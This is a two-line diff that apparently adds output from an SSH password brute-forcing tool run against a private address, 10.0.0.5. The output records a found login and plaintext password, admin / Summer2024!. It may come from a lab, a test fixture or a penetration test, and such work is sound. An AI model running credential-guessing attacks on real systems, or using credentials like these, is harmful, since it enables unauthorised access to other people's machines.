@@ -1,0 +1,2 @@
+[DATA] attacking ssh://10.0.0.5:22/
+[22][ssh] host: 10.0.0.5   login: admin   password: Summer2024!
